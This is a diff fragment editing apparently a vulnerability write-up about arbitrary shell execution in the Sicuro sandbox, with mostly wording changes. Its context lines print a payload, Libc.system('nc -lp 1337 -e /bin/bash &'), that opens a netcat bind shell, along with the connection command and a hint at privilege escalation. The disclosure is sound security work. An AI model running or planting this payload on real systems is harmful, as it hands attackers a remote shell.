@@ -46,9 +46,9 @@ Here is similar code that will allow you to execute arbitrary shell code:
     
     Libc.system('nc -lp 1337 -e /bin/bash &amp;')
 
-Congratulations, you now can run `netcat $IP 1337` to connect.
+Congratulations, you now can run `netcat $IP 1337` to connect. The IP could easily be gained through similar means.
 
-There's a video at the bottom, but odds are it's entirely unintelligible, so you can [go directly to the video](/assets/sicuro-untrusted-code-execution-bug.ogv).
+There's a video at the bottom, but it's a bit difficult to read at that scale, so you can [go directly to the video](/assets/sicuro-untrusted-code-execution-bug.ogv).
 
 It may also be possible to escalate privileges using this.
 
